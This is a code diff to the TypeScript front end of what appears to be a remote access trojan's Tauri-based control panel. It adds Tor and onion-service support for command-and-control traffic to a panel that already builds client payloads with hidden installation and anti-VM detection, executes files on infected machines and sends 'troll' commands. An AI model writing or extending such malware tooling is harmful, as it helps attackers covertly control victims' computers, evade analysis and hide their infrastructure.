@@ -1,5 +1,11 @@
 import { invoke } from "@tauri-apps/api/core";
-import { RATClient, RATState, AssemblyInfo, TrollCommand } from "../../types";
+import {
+  RATClient,
+  RATState,
+  AssemblyInfo,
+  TrollCommand,
+  OnionServiceInfo,
+} from "../../types";
 
 export const startServerCmd = async (port: string): Promise<string> => {
   return invoke("start_server", { port });
@@ -23,7 +29,9 @@ export const buildClientCmd = async (
   installFileName: string,
   group: string,
   enableHidden: boolean,
-  antiVmDetection: boolean
+  antiVmDetection: boolean,
+  useTor: boolean,
+  torAddress: string
 ): Promise<void> => {
   return invoke("build_client", {
     ip,
@@ -40,6 +48,8 @@ export const buildClientCmd = async (
     group,
     enableHidden,
     antiVmDetection,
+    useTor,
+    torAddress,
   });
 };
 
@@ -283,6 +293,17 @@ export const executeFile = async (
   filePath: string
 ): Promise<void> => {
   return invoke("execute_file", { addr, filePath });
+};
+
+export const initTorCmd = async (): Promise<OnionServiceInfo[]> => {
+  return invoke("init_tor");
+};
+
+export const createOnionCmd = async (
+  nickname: string,
+  port: number
+): Promise<OnionServiceInfo> => {
+  return invoke("create_onion", { nickname, port });
 };
 
 export const sendTrollCommand = async (
